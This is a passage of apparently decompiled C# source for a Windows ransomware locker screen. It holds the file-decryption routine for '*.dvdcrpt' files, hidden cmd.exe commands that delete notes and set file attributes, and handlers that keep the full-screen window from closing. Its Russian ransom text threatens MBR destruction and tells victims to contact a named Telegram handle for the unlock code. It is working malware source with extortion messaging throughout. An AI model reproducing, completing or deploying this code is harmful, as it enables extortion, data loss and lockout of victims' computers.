										this.errx.Text = "Файлы восстановлены не полностью. Введите следующий пароль.";
										return;
									}
									ProcessStartInfo startInfo = new ProcessStartInfo("cmd.exe")
									{
										Arguments = Environment.ExpandEnvironmentVariables("/c %SystemRoot%\\Explorer.exe"),
										WindowStyle = ProcessWindowStyle.Hidden
									};
									Process.Start(startInfo);
								}
								catch { }
								ProjectData.EndApp();
							}));
						}
						catch (ObjectDisposedException) { }
					}
				});
				decryptThread.Name = "DecryptThread";
				decryptThread.Start();
			}
		}

		private bool DecryptAllFiles()
		{
			try
			{
				List<byte[]> keys = GForm1.SessionKeys;
				byte[] fallbackKey = GForm1.SessionKey;
				if ((keys == null || keys.Count == 0) && fallbackKey == null) return false;
				byte[] confirmedKey = null;
				string[] drives = Directory.GetLogicalDrives();
				foreach (string drive in drives)
				{
					try
					{
						string[] files = Directory.GetFiles(drive, "*.dvdcrpt", SearchOption.AllDirectories);
						foreach (string encryptedPath in files)
						{
							try
							{
								string outputPath = encryptedPath.Substring(0, encryptedPath.Length - 8);
										bool ok = false;
										if (confirmedKey != null)
										{
											ok = HybridCrypto.DecryptFile(encryptedPath, outputPath, confirmedKey);
										}
										if (!ok && keys != null)
										{
											foreach (byte[] k in keys)
											{
												if (k == null) continue;
												if (ReferenceEquals(k, confirmedKey)) continue;
												if (HybridCrypto.DecryptFile(encryptedPath, outputPath, k))
												{
													ok = true;
													confirmedKey = k;
													break;
												}
											}
										}
										if (!ok && fallbackKey != null)
									ok = HybridCrypto.DecryptFile(encryptedPath, outputPath, fallbackKey);
								if (ok)
								{
									try { File.Delete(encryptedPath); } catch { }
								}
							}
							catch { }
						}
					}
					catch { }
				}
				return HasNoEncryptedFilesLeft();
			}
			catch { }
			return false;
		}

		private bool HasNoEncryptedFilesLeft()
		{
			try
			{
				string[] drives = Directory.GetLogicalDrives();
				foreach (string drive in drives)
				{
					try
					{
						if (Directory.GetFiles(drive, "*.dvdcrpt", SearchOption.AllDirectories).Length > 0)
							return false;
					}
					catch { }
				}
				return true;
			}
			catch { }
			return false;
		}

				private byte[] VerifyPasswordAndGetKey(string enteredPassword)
		{
			try
			{
				byte[] sessionKey = KeyPersistence.LoadSessionKeyFromPassword(enteredPassword);
				if (sessionKey == null) return null;
				if (sessionKey.Length != 32) return null;
				return sessionKey;
			}
			catch
			{
				return null;
			}
		}

		private List<byte[]> UnlockKeysFromText(string text)
		{
			var result = new List<byte[]>();
			if (string.IsNullOrEmpty(text)) return result;

			char[] separators = new char[] { '|', ';', ',', ' ' };
			string[] parts = text.Split(separators, StringSplitOptions.RemoveEmptyEntries);
			foreach (string part in parts)
			{
				byte[] k = VerifyPasswordAndGetKey(part);
				if (k == null) continue;
				bool duplicate = false;
				foreach (byte[] existing in result)
				{
					if (existing.Length != k.Length) continue;
					bool same = true;
					for (int i = 0; i < k.Length; i++)
					{
						if (existing[i] != k[i]) { same = false; break; }
					}
					if (same) { duplicate = true; break; }
				}
				if (!duplicate) result.Add(k);
			}
			return result;
		}

		// Token: 0x060003EF RID: 1007 RVA: 0x00018E4C File Offset: 0x0001704C
		private void method_6()
		{
			checked
			{
				try
				{
					string str = Class1.MyForms_0.loader.string_3.Replace("$", "-") + " & del info-Locker.txt /q /s & attrib +h +s -r desktop.ini";
					string[] array = new string[]
					{
						"%userprofile%\\desktop",
						"%systemdrive%\\Users\\Public\\Desktop",
						"%userprofile%\\downloads",
						"%userprofile%\\documents",
						"%userprofile%"
					};
					int num = Class1.MyForms_0.loader.string_0.Length - 1;
					for (int i = 0; i <= num; i++)
					{
						bool flag = Directory.Exists(Class1.MyForms_0.loader.string_0[i] + ":\\");
						if (flag)
						{
							string str2 = Class1.MyForms_0.loader.string_0[i] + ":";
							Interaction.Shell("cmd.exe /c " + str2 + " & " + str, AppWinStyle.Hide, false, -1);
						}
					}
					int num2 = array.Length - 1;
					for (int j = 0; j <= num2; j++)
					{
						Interaction.Shell("cmd.exe /c cd \"" + array[j] + "\"&" + str, AppWinStyle.Hide, false, -1);
					}
				}
				catch (Exception ex)
				{
				}
			}
		}

		// Token: 0x060003F0 RID: 1008 RVA: 0x00018FB8 File Offset: 0x000171B8
		private void method_7(object sender, KeyEventArgs e)
		{
			bool flag = e.KeyCode == Keys.Return;
			if (flag)
			{
				Label menu = this.menu1;
				menu.BackColor = Color.SlateBlue;
				menu.ForeColor = Color.White;
			}
		}

		// Token: 0x060003F1 RID: 1009 RVA: 0x00018FF8 File Offset: 0x000171F8
		public void method_8()
		{
			if (this.countdownSeconds > 0) return;
			try
			{
				VB_0024AnonymousDelegate_0 vb_0024AnonymousDelegate_ = checked(delegate()
				{
					int num = 0;
					do
					{
						Console.Beep(750, 120);
						num++;
					}
					while (num <= 1);
				});
				VB_0024AnonymousDelegate_0 vb_0024AnonymousDelegate_2 = vb_0024AnonymousDelegate_;
				Thread thread = new Thread((vb_0024AnonymousDelegate_2 == null) ? null : new ThreadStart(vb_0024AnonymousDelegate_2.Invoke));
				thread.Start();
			}
			catch (Exception ex)
			{
			}
		}

		// Token: 0x060003F2 RID: 1010 RVA: 0x00019070 File Offset: 0x00017270
		public void method_9()
		{
			if (this.countdownSeconds > 0) return;
			try
			{
				VB_0024AnonymousDelegate_0 vb_0024AnonymousDelegate_ = delegate()
				{
					Console.Beep(800, 950);
				};
				VB_0024AnonymousDelegate_0 vb_0024AnonymousDelegate_2 = vb_0024AnonymousDelegate_;
				Thread thread = new Thread((vb_0024AnonymousDelegate_2 != null) ? new ThreadStart(vb_0024AnonymousDelegate_2.Invoke) : null);
				thread.Start();
			}
			catch (Exception ex)
			{
			}
		}

		// Token: 0x060003F3 RID: 1011 RVA: 0x000190E8 File Offset: 0x000172E8
		public void method_10()
		{
			if (this.countdownSeconds > 0) return;
			try
			{
				VB_0024AnonymousDelegate_0 vb_0024AnonymousDelegate_ = delegate()
				{
					Console.Beep(500, 600);
				};
				VB_0024AnonymousDelegate_0 vb_0024AnonymousDelegate_2 = vb_0024AnonymousDelegate_;
				Thread thread = new Thread((vb_0024AnonymousDelegate_2 == null) ? null : new ThreadStart(vb_0024AnonymousDelegate_2.Invoke));
				thread.Start();
			}
			catch (Exception ex)
			{
			}
		}

		// Token: 0x060003F4 RID: 1012
		// WinAPI moved to NativeMethods.cs

		// Token: 0x060003F5 RID: 1013 RVA: 0x00002D2D File Offset: 0x00000F2D
private void GForm2_FormClosing(object sender, FormClosingEventArgs e)
        {
            if (!_cursorLockStopped) this.vmethod_8().Start();
            e.Cancel = true;
        }

		// Фиксация прошедшего времени на выходе из сессии / suspend.
		private void GForm2_SessionEnding(object sender, Microsoft.Win32.SessionEndingEventArgs e)
		{
			try { ShutdownTrigger.ForcePersistElapsed(); } catch { }
		}

		private void GForm2_PowerModeChanged(object sender, Microsoft.Win32.PowerModeChangedEventArgs e)
		{
			try
			{
				if (e.Mode == Microsoft.Win32.PowerModes.Suspend)
					ShutdownTrigger.ForcePersistElapsed();
			}
			catch { }
		}

		// Token: 0x060003F6 RID: 1014 RVA: 0x00002D44 File Offset: 0x00000F44
		private void method_11(object sender, EventArgs e)
		{
			NativeMethods.mouse_event(2, 0, 0, 3, 3);
			NativeMethods.mouse_event(4, 0, 0, 3, 3);
		}

		// Token: 0x060003F7 RID: 1015 RVA: 0x00019160 File Offset: 0x00017360
		private void method_12(object sender, EventArgs e)
		{
			object ptr = this.object_4;
			ptr = Operators.AddObject(ptr, 1);
			this.object_4 = ptr;
			bool flag = Operators.ConditionalCompareObjectEqual(this.object_4, 1, false);
			if (flag)
			{
				this.method_10();
			}
			this.ByPassMessage.Visible = true;
			object left = this.object_4;
			bool flag2 = Operators.ConditionalCompareObjectEqual(left, 5, false);
			if (flag2)
			{
				this.ByPassWarnMsg.ForeColor = Color.FromArgb(192, 0, 0);
				this.ByPassWarnMsg.BackColor = Color.White;
			}
			else
			{
				bool flag3 = Operators.ConditionalCompareObjectEqual(left, 10, false);
				if (flag3)
				{
					this.ByPassWarnMsg.ForeColor = Color.White;
					this.ByPassWarnMsg.BackColor = Color.FromArgb(192, 0, 0);
				}
				else
				{
					bool flag4 = !Operators.ConditionalCompareObjectEqual(left, 15, false);
					if (flag4)
					{
						bool flag5 = Operators.ConditionalCompareObjectEqual(left, 20, false);
						if (flag5)
						{
							this.ByPassWarnMsg.ForeColor = Color.White;
							this.ByPassWarnMsg.BackColor = Color.FromArgb(192, 0, 0);
						}
						else
						{
							bool flag6 = Operators.ConditionalCompareObjectEqual(left, 100, false);
							if (flag6)
							{
								this.ByPassMessage.Visible = false;
								this.vmethod_8().Stop();
								this.object_4 = 0;
							}
						}
					}
					else
					{
						this.ByPassWarnMsg.ForeColor = Color.FromArgb(192, 0, 0);
						this.ByPassWarnMsg.BackColor = Color.White;
					}
				}
			}
		}

		// Token: 0x060003F8 RID: 1016 RVA: 0x00002951 File Offset: 0x00000B51
		private void method_13(object sender, EventArgs e)
		{
		}

		// Token: 0x060003F9 RID: 1017 RVA: 0x00002951 File Offset: 0x00000B51
		private void method_14(object sender, EventArgs e)
		{
		}

		// Token: 0x060003FA RID: 1018 RVA: 0x00002951 File Offset: 0x00000B51
		private void method_15(object sender, EventArgs e)
		{
			RulesForm.ShowRules(this);
		}


	private void menu1_Click(object sender, EventArgs e)
		{
			RulesForm.ShowRules(this);
		}

		// Token: 0x060003FC RID: 1020 RVA: 0x00019354 File Offset: 0x00017554
		private void method_16()
		{
			this.container_0 = new Container();
			ComponentResourceManager componentResourceManager = new ComponentResourceManager(typeof(GForm2));
			this.g1 = new Label();
			this.a1 = new Panel();
			this.s2 = new Label();
			this.tg = new Label();
			this.s1 = new Label();
			this.border_6 = new PictureBox();
			this.border_5 = new PictureBox();
			this.border_2 = new PictureBox();
			this.border_1 = new PictureBox();
			this.main = new Panel();
			this.ByPassMessage = new Panel();
			this.c3 = new PictureBox();
			this.c2 = new PictureBox();
			this.c4 = new PictureBox();
			this.c1 = new PictureBox();
			this.ByPassWarnMsg = new Label();
			this.Safe1 = new PictureBox();
			this.Safe2 = new PictureBox();
			this.ID = new Label();
			this.UserInfo = new Label();
			this.Title = new Label();
			this.menu1 = new Label();
this.menu1.Click += new EventHandler(this.menu1_Click);
			this.a2 = new Panel();
			this.errx = new Label();
			this.border_8 = new PictureBox();
			this.border_7 = new PictureBox();
			this.border_4 = new PictureBox();
			this.border_3 = new PictureBox();
			this.inputPS = new Label();
			this.keytext = new Label();
			this.hdn = new TextBox();
			this.vmethod_1(new System.Windows.Forms.Timer(this.container_0));
			this.vmethod_3(new System.Windows.Forms.Timer(this.container_0));
			this.art = new Label();
			this.vmethod_5(new System.Windows.Forms.Timer(this.container_0));
			this.vmethod_7(new System.Windows.Forms.Timer(this.container_0));
			this.vmethod_9(new System.Windows.Forms.Timer(this.container_0));
			this.a1.SuspendLayout();
			((ISupportInitialize)this.border_6).BeginInit();
			((ISupportInitialize)this.border_5).BeginInit();
			((ISupportInitialize)this.border_2).BeginInit();
			((ISupportInitialize)this.border_1).BeginInit();
			this.main.SuspendLayout();
			this.ByPassMessage.SuspendLayout();
			((ISupportInitialize)this.c3).BeginInit();
			((ISupportInitialize)this.c2).BeginInit();
			((ISupportInitialize)this.c4).BeginInit();
			((ISupportInitialize)this.c1).BeginInit();
			((ISupportInitialize)this.Safe1).BeginInit();
			((ISupportInitialize)this.Safe2).BeginInit();
			this.a2.SuspendLayout();
			((ISupportInitialize)this.border_8).BeginInit();
			((ISupportInitialize)this.border_7).BeginInit();
			((ISupportInitialize)this.border_4).BeginInit();
			((ISupportInitialize)this.border_3).BeginInit();
			base.SuspendLayout();
			this.g1.Font = new Font("Lucida Console", 14.25f, FontStyle.Regular, GraphicsUnit.Point, 204);
			this.g1.ForeColor = Color.DarkRed;
			this.g1.Location = new Point(6, 1);
			this.g1.Name = "g1";
			this.g1.Size = new Size(807, 153);
			this.g1.TabIndex = 0;
			this.g1.Text = "Упс! Вы подверглись масштабной хакерской атаке и теперь Ваш компьютер заблокирован, а все имеющиеся диски и файлы на них зашифрованы хакером eqtq27. Любые действия, связанные с попыткой обмануть систему нанесут непоправимый вред Вашему компьютеру и приведут к потере всех важных файлов без возможности восстановления. При попытке снять блокировку MBR ( главный загрузчик материнки) будет снесён и будет подана рекурсивная нагрузка на ваш процессор, что приведёт к его неисправности. У вас есть 10 попыток чтобы ввести код, при исчерпании которых система будет уничтожена";
			this.g1.TextAlign = ContentAlignment.MiddleLeft;
			this.a1.Anchor = AnchorStyles.None;
			this.a1.Controls.Add(this.s2);
			this.a1.Controls.Add(this.tg);
			this.a1.Controls.Add(this.s1);
			this.a1.Controls.Add(this.border_6);
			this.a1.Controls.Add(this.border_5);
			this.a1.Controls.Add(this.border_2);
			this.a1.Controls.Add(this.border_1);
			this.a1.Controls.Add(this.g1);
			this.a1.Font = new Font("Microsoft Sans Serif", 12f, FontStyle.Regular, GraphicsUnit.Point, 204);
			this.a1.Location = new Point(97, 147);
			this.a1.Name = "a1";
			this.a1.Size = new Size(813, 178);
			this.a1.TabIndex = 2;
			this.a1.Visible = false;
			this.s2.Font = new Font("Lucida Console", 15.75f, FontStyle.Regular, GraphicsUnit.Point, 204);
			this.s2.ForeColor = Color.WhiteSmoke;
			this.s2.Location = new Point(647, 154);
			this.s2.Name = "s2";
			this.s2.Size = new Size(140, 23);
			this.s2.TabIndex = 12;
			this.s2.Text = "(Telegram)";
			this.tg.BackColor = Color.Transparent;
			this.tg.Font = new Font("Lucida Console", 15.75f, FontStyle.Underline, GraphicsUnit.Point, 204);
			this.tg.ForeColor = Color.FromArgb(255, 255, 192);
			this.tg.Location = new Point(411, 154);
			this.tg.Name = "tg";
			this.tg.Size = new Size(234, 23);
			this.tg.TabIndex = 11;
			this.tg.Text = "@eqtq27";
			this.tg.TextAlign = ContentAlignment.TopCenter;
			this.s1.Font = new Font("Lucida Console", 15.75f, FontStyle.Regular, GraphicsUnit.Point, 204);
			this.s1.ForeColor = Color.WhiteSmoke;
			this.s1.Location = new Point(10, 151);
			this.s1.Name = "s1";
			this.s1.Size = new Size(395, 23);
			this.s1.TabIndex = 10;
			this.s1.Text = "Что бы получить код, напиши";
			this.border_6.BackColor = Color.FromArgb(150, 255, 195);
			this.border_6.Dock = DockStyle.Right;
			this.border_6.Location = new Point(811, 1);
			this.border_6.Name = "border_6";
			this.border_6.Size = new Size(2, 176);
			this.border_6.TabIndex = 9;
			this.border_6.TabStop = false;
			this.border_5.BackColor = Color.FromArgb(150, 255, 195);
			this.border_5.Dock = DockStyle.Left;
			this.border_5.Location = new Point(0, 1);
			this.border_5.Name = "border_5";
			this.border_5.Size = new Size(2, 176);
			this.border_5.TabIndex = 8;
			this.border_5.TabStop = false;
			this.border_2.BackColor = Color.FromArgb(150, 255, 195);
			this.border_2.Dock = DockStyle.Bottom;
			this.border_2.Location = new Point(0, 177);
			this.border_2.Name = "border_2";
			this.border_2.Size = new Size(813, 1);
			this.border_2.TabIndex = 7;
			this.border_2.TabStop = false;
			this.border_1.BackColor = Color.FromArgb(150, 255, 195);
			this.border_1.Dock = DockStyle.Top;
			this.border_1.Location = new Point(0, 0);
			this.border_1.Name = "border_1";
			this.border_1.Size = new Size(813, 1);
			this.border_1.TabIndex = 6;
			this.border_1.TabStop = false;
			this.main.BackColor = Color.FromName("Black");
			this.main.Controls.Add(this.ByPassMessage);
			this.main.Controls.Add(this.Safe1);
			this.main.Controls.Add(this.Safe2);
			this.main.Controls.Add(this.ID);
			this.main.Controls.Add(this.UserInfo);
			this.main.Controls.Add(this.Title);
			this.main.Controls.Add(this.menu1);
			this.main.Controls.Add(this.a2);
			this.main.Controls.Add(this.hdn);
			this.main.Controls.Add(this.a1);
			this.main.Dock = DockStyle.Fill;
			this.main.Font = new Font("Microsoft Sans Serif", 9.75f, FontStyle.Regular, GraphicsUnit.Point, 204);
			this.main.Location = new Point(0, 0);
			this.main.Name = "main";
			this.main.Size = new Size(1006, 540);
			this.main.TabIndex = 1;
			this.main.Visible = false;
			this.ByPassMessage.Anchor = AnchorStyles.None;
			this.ByPassMessage.Controls.Add(this.c3);
			this.ByPassMessage.Controls.Add(this.c2);
			this.ByPassMessage.Controls.Add(this.c4);
			this.ByPassMessage.Controls.Add(this.c1);
			this.ByPassMessage.Controls.Add(this.ByPassWarnMsg);
			this.ByPassMessage.Font = new Font("Microsoft Sans Serif", 12f, FontStyle.Regular, GraphicsUnit.Point, 204);
			this.ByPassMessage.ForeColor = Color.FromArgb(192, 0, 0);
			this.ByPassMessage.Location = new Point(324, 208);
			this.ByPassMessage.Name = "ByPassMessage";
			this.ByPassMessage.Size = new Size(373, 178);
			this.ByPassMessage.TabIndex = 18;
			this.ByPassMessage.Visible = false;
			this.c3.BackColor = Color.FromArgb(150, 255, 195);
			this.c3.Dock = DockStyle.Right;
			this.c3.Location = new Point(371, 1);
			this.c3.Name = "c3";
			this.c3.Size = new Size(2, 176);
			this.c3.TabIndex = 9;
			this.c3.TabStop = false;
			this.c2.BackColor = Color.FromArgb(150, 255, 195);
			this.c2.Dock = DockStyle.Left;
			this.c2.Location = new Point(0, 1);
			this.c2.Name = "c2";
			this.c2.Size = new Size(2, 176);
			this.c2.TabIndex = 8;
			this.c2.TabStop = false;
			this.c4.BackColor = Color.FromArgb(150, 255, 195);
			this.c4.Dock = DockStyle.Bottom;
			this.c4.Location = new Point(0, 177);
			this.c4.Name = "c4";
			this.c4.Size = new Size(373, 1);
			this.c4.TabIndex = 7;
			this.c4.TabStop = false;
			this.c1.BackColor = Color.FromArgb(150, 255, 195);
			this.c1.Dock = DockStyle.Top;
			this.c1.Location = new Point(0, 0);
			this.c1.Name = "c1";
			this.c1.Size = new Size(373, 1);
			this.c1.TabIndex = 6;
			this.c1.TabStop = false;
			this.ByPassWarnMsg.BackColor = Color.FromArgb(192, 0, 0);
			this.ByPassWarnMsg.Dock = DockStyle.Fill;
			this.ByPassWarnMsg.Font = new Font("Lucida Console", 14.25f, FontStyle.Regular, GraphicsUnit.Point, 204);
			this.ByPassWarnMsg.ForeColor = Color.White;
			this.ByPassWarnMsg.Location = new Point(0, 0);
			this.ByPassWarnMsg.Name = "ByPassWarnMsg";
			this.ByPassWarnMsg.Size = new Size(373, 178);
			this.ByPassWarnMsg.TabIndex = 0;
			this.ByPassWarnMsg.Text = "Замечена и остановлена попытка обмануть систему!";
			this.ByPassWarnMsg.TextAlign = ContentAlignment.MiddleCenter;
			this.Safe1.BackColor = Color.Black;
			this.Safe1.Dock = DockStyle.Left;
			this.Safe1.Location = new Point(0, 0);
			this.Safe1.Name = "Safe1";
			this.Safe1.Size = new Size(70, 540);
			this.Safe1.TabIndex = 14;
			this.Safe1.TabStop = false;
			this.Safe2.BackColor = Color.Black;
			this.Safe2.Dock = DockStyle.Right;
			this.Safe2.Location = new Point(936, 0);
			this.Safe2.Name = "Safe2";
			this.Safe2.Size = new Size(70, 540);
			this.Safe2.TabIndex = 15;
			this.Safe2.TabStop = false;
			this.ID.Anchor = (AnchorStyles.Bottom | AnchorStyles.Left);
			this.ID.Font = new Font("MS Gothic", 9.75f, FontStyle.Bold, GraphicsUnit.Point, 204);
			this.ID.ForeColor = Color.White;
			this.ID.Location = new Point(74, 517);
			this.ID.Name = "ID";
			this.ID.Size = new Size(856, 23);
			this.ID.TabIndex = 17;
			this.ID.Text = "ID: 88-E------";
			this.ID.TextAlign = ContentAlignment.MiddleLeft;
			this.ID.Visible = false;
			this.UserInfo.Anchor = AnchorStyles.None;
			this.UserInfo.Font = new Font("Lucida Console", 11.25f, FontStyle.Regular, GraphicsUnit.Point, 204);
			this.UserInfo.ForeColor = Color.Silver;
			this.UserInfo.Location = new Point(97, 427);
			this.UserInfo.Name = "UserInfo";
			this.UserInfo.Size = new Size(900, 100);
			this.UserInfo.TabIndex = 16;
			this.UserInfo.TextAlign = ContentAlignment.MiddleLeft;
			this.UserInfo.Visible = false;
			this.Title.Anchor = AnchorStyles.None;
			this.Title.BackColor = Color.White;
			this.Title.Font = new Font("Lucida Console", 14.25f, FontStyle.Regular, GraphicsUnit.Point, 204);
			this.Title.ForeColor = Color.Black;
			this.Title.Location = new Point(332, 119);
			this.Title.Name = "Title";
			this.Title.Size = new Size(342, 23);
			this.Title.TabIndex = 13;
			this.Title.Text = "Ваши файлы зашифрованы!";
			this.Title.TextAlign = ContentAlignment.MiddleCenter;
			this.menu1.Anchor = AnchorStyles.None;
			this.menu1.BackColor = Color.FromName("Black");
			this.menu1.Font = new Font("Lucida Console", 15.75f, FontStyle.Regular, GraphicsUnit.Point, 204);
			this.menu1.ForeColor = Color.White;
			this.menu1.Location = new Point(744, 427);
			this.menu1.Name = "menu1";
			this.menu1.Size = new Size(166, 23);
			this.menu1.TabIndex = 12;
			this.menu1.Text = "пробел-открыть правила";
			this.menu1.TextAlign = ContentAlignment.MiddleCenter;
			this.menu1.Visible = true;
			this.a2.Anchor = AnchorStyles.None;
			this.a2.Controls.Add(this.errx);
			this.a2.Controls.Add(this.border_8);
			this.a2.Controls.Add(this.border_7);
			this.a2.Controls.Add(this.border_4);
			this.a2.Controls.Add(this.border_3);
			this.a2.Controls.Add(this.inputPS);
			this.a2.Controls.Add(this.keytext);
			this.a2.Font = new Font("Microsoft Sans Serif", 12f, FontStyle.Regular, GraphicsUnit.Point, 204);
			this.a2.Location = new Point(97, 330);
			this.a2.Name = "a2";
			this.a2.Size = new Size(813, 94);
			this.a2.TabIndex = 5;
			this.a2.Visible = false;
			this.errx.BackColor = Color.Transparent;
			this.errx.Font = new Font("Lucida Console", 15.75f);
			this.errx.ForeColor = Color.MistyRose;
			this.errx.Location = new Point(3, 62);
			this.errx.Name = "errx";
			this.errx.Size = new Size(807, 24);
			this.errx.TabIndex = 11;
			this.errx.Text = "Ошибка! Введённый код не совпадает с ключом разблокировки.";
			this.errx.TextAlign = ContentAlignment.TopCenter;
			this.errx.Visible = false;
			this.border_8.BackColor = Color.FromArgb(150, 255, 195);
			this.border_8.Dock = DockStyle.Right;
			this.border_8.Location = new Point(811, 1);
			this.border_8.Name = "border_8";
			this.border_8.Size = new Size(2, 92);
			this.border_8.TabIndex = 10;
			this.border_8.TabStop = false;
			this.border_7.BackColor = Color.FromArgb(150, 255, 195);
			this.border_7.Dock = DockStyle.Left;
			this.border_7.Location = new Point(0, 1);
			this.border_7.Name = "border_7";
			this.border_7.Size = new Size(2, 92);
			this.border_7.TabIndex = 9;
			this.border_7.TabStop = false;
			this.border_4.BackColor = Color.FromArgb(150, 255, 195);
			this.border_4.Dock = DockStyle.Bottom;
			this.border_4.Location = new Point(0, 93);
			this.border_4.Name = "border_4";
			this.border_4.Size = new Size(813, 1);
			this.border_4.TabIndex = 8;
			this.border_4.TabStop = false;
			this.border_3.BackColor = Color.FromArgb(150, 255, 195);
			this.border_3.Dock = DockStyle.Top;
			this.border_3.Location = new Point(0, 0);
			this.border_3.Name = "border_3";
			this.border_3.Size = new Size(813, 1);
			this.border_3.TabIndex = 7;
			this.border_3.TabStop = false;
			this.inputPS.BackColor = Color.White;
			this.inputPS.Font = new Font("Lucida Console", 15.75f);
			this.inputPS.ForeColor = Color.Black;
			this.inputPS.Location = new Point(8, 29);
			this.inputPS.Name = "inputPS";
			this.inputPS.Size = new Size(797, 25);
			this.inputPS.TabIndex = 5;
			this.inputPS.Text = " ";
			this.inputPS.TextAlign = ContentAlignment.MiddleCenter;
			this.keytext.Font = new Font("Lucida Console", 15.75f);
			this.keytext.Location = new Point(3, 6);
			this.keytext.Name = "keytext";
			this.keytext.Size = new Size(807, 24);
			this.keytext.TabIndex = 4;
			this.keytext.Text = "Введите код разблокировки:";
			this.keytext.TextAlign = ContentAlignment.TopCenter;
			this.hdn.Location = new Point(-17, 4);
			this.hdn.MaxLength = 45;
			this.hdn.Name = "hdn";
			this.hdn.Size = new Size(10, 22);
			this.hdn.TabIndex = 3;
			this.vmethod_0().Enabled = true;
			this.vmethod_0().Interval = 5;
			this.vmethod_2().Enabled = true;
			this.vmethod_2().Interval = 9;
			this.art.Dock = DockStyle.Fill;
			this.art.Font = new Font("Lucida Console", 20.25f, FontStyle.Bold, GraphicsUnit.Point, 204);
			this.art.Image = null;
			this.art.Text = null;
			this.art.Location = new Point(0, 0);
			this.art.Name = "art";
			this.art.Size = new Size(1006, 540);
			this.art.TabIndex = 14;
			this.art.TabIndex = 14;
			this.vmethod_4().Interval = 40;
			this.vmethod_6().Enabled = true;
			this.vmethod_6().Interval = 500;
			this.vmethod_8().Interval = 10;
			base.AutoScaleDimensions = new SizeF(6f, 13f);
			base.AutoScaleMode = AutoScaleMode.Font;
			this.BackColor = Color.FromName("Black");
			base.ClientSize = new Size(1006, 540);
			base.Controls.Add(this.main);
			base.Controls.Add(this.art);
			this.ForeColor = Color.White;
			base.FormBorderStyle = FormBorderStyle.None;
			base.Icon = (Icon)componentResourceManager.GetObject("$this.Icon");
			base.Name = "_o_program";
			base.ShowIcon = false;
			base.ShowInTaskbar = false;
			base.StartPosition = FormStartPosition.CenterScreen;
			base.TopMost = true;
			base.WindowState = FormWindowState.Maximized;
			this.a1.ResumeLayout(false);
			((ISupportInitialize)this.border_6).EndInit();
			((ISupportInitialize)this.border_5).EndInit();
			((ISupportInitialize)this.border_2).EndInit();
			((ISupportInitialize)this.border_1).EndInit();
			this.main.ResumeLayout(false);
			this.main.PerformLayout();
			this.ByPassMessage.ResumeLayout(false);
			((ISupportInitialize)this.c3).EndInit();
			((ISupportInitialize)this.c2).EndInit();
			((ISupportInitialize)this.c4).EndInit();
			((ISupportInitialize)this.c1).EndInit();
			((ISupportInitialize)this.Safe1).EndInit();
			((ISupportInitialize)this.Safe2).EndInit();
			this.a2.ResumeLayout(false);
			((ISupportInitialize)this.border_8).EndInit();
			((ISupportInitialize)this.border_7).EndInit();
			((ISupportInitialize)this.border_4).EndInit();
			((ISupportInitialize)this.border_3).EndInit();
			base.ResumeLayout(false);
		}

		// Token: 0x060003FD RID: 1021 RVA: 0x0001AD94 File Offset: 0x00018F94
		[CompilerGenerated]
		internal virtual System.Windows.Forms.Timer vmethod_0()
		{
			return this.timer_0;
		}

		// Token: 0x060003FE RID: 1022 RVA: 0x0001ADAC File Offset: 0x00018FAC
		[CompilerGenerated]
		internal virtual void vmethod_1(System.Windows.Forms.Timer timer_5)
		{
			EventHandler value = new EventHandler(this.method_0);
			System.Windows.Forms.Timer timer = this.timer_0;
			bool flag = timer != null;
			if (flag)
			{
				timer.Tick -= value;
			}
			this.timer_0 = timer_5;
			timer = this.timer_0;
			bool flag2 = timer != null;
			if (flag2)
			{
				timer.Tick += value;
			}
		}

		// Token: 0x060003FF RID: 1023 RVA: 0x0001AE00 File Offset: 0x00019000
		[CompilerGenerated]
		internal virtual System.Windows.Forms.Timer vmethod_2()
		{
			return this.timer_1;
		}

		// Token: 0x06000400 RID: 1024 RVA: 0x0001AE18 File Offset: 0x00019018
		[CompilerGenerated]
		internal virtual void vmethod_3(System.Windows.Forms.Timer timer_5)
		{
			EventHandler value = new EventHandler(this.method_1);
			System.Windows.Forms.Timer timer = this.timer_1;
			bool flag = timer != null;
			if (flag)
			{
				timer.Tick -= value;
			}
			this.timer_1 = timer_5;
			timer = this.timer_1;
			bool flag2 = timer != null;
			if (flag2)
			{
				timer.Tick += value;
			}
		}

		// Token: 0x06000401 RID: 1025 RVA: 0x0001AE6C File Offset: 0x0001906C
		[CompilerGenerated]
		internal virtual System.Windows.Forms.Timer vmethod_4()
		{
			return this.timer_2;
		}

		// Token: 0x06000402 RID: 1026 RVA: 0x0001AE84 File Offset: 0x00019084
		[CompilerGenerated]
		internal virtual void vmethod_5(System.Windows.Forms.Timer timer_5)
		{
			EventHandler value = new EventHandler(this.method_4);
			System.Windows.Forms.Timer timer = this.timer_2;
			bool flag = timer != null;
			if (flag)
			{
				timer.Tick -= value;
			}
			this.timer_2 = timer_5;
			timer = this.timer_2;
			bool flag2 = timer != null;
			if (flag2)
			{
				timer.Tick += value;
			}
		}

		// Token: 0x06000403 RID: 1027 RVA: 0x0001AED8 File Offset: 0x000190D8
		[CompilerGenerated]
		internal virtual System.Windows.Forms.Timer vmethod_6()
		{
			return this.timer_3;
		}

		// Token: 0x06000404 RID: 1028 RVA: 0x0001AEF0 File Offset: 0x000190F0
		[CompilerGenerated]
		internal virtual void vmethod_7(System.Windows.Forms.Timer timer_5)
		{
			EventHandler value = new EventHandler(this.method_11);
			System.Windows.Forms.Timer timer = this.timer_3;
			bool flag = timer != null;
			if (flag)
			{
				timer.Tick -= value;
			}
			this.timer_3 = timer_5;
			timer = this.timer_3;
			bool flag2 = timer != null;
			if (flag2)
			{
				timer.Tick += value;
			}
		}

		// Token: 0x06000405 RID: 1029 RVA: 0x0001AF44 File Offset: 0x00019144
		[CompilerGenerated]
		internal virtual System.Windows.Forms.Timer vmethod_8()
		{
			return this.timer_4;
		}

		// Token: 0x06000406 RID: 1030 RVA: 0x0001AF5C File Offset: 0x0001915C
		[CompilerGenerated]
		internal virtual void vmethod_9(System.Windows.Forms.Timer timer_5)
		{
			EventHandler value = new EventHandler(this.method_12);
			System.Windows.Forms.Timer timer = this.timer_4;
			bool flag = timer != null;
			if (flag)
			{
				timer.Tick -= value;
			}
			this.timer_4 = timer_5;
			timer = this.timer_4;
			bool flag2 = timer != null;
			if (flag2)
			{
				timer.Tick += value;
			}
		}

		// Token: 0x040000B9 RID: 185
		public string string_0;

		// Token: 0x040000BA RID: 186
		private object object_0;

		// Token: 0x040000BB RID: 187
		private object object_1;

		// Token: 0x040000BC RID: 188
		private object object_2;

		// Token: 0x040000BD RID: 189
		private object object_3;

		// Token: 0x040000BE RID: 190
		private object object_4;

		// Token: 0x040000C0 RID: 192
		[AccessedThroughProperty("g1")]
		[CompilerGenerated]
		private Label label_0;

		// Token: 0x040000C1 RID: 193
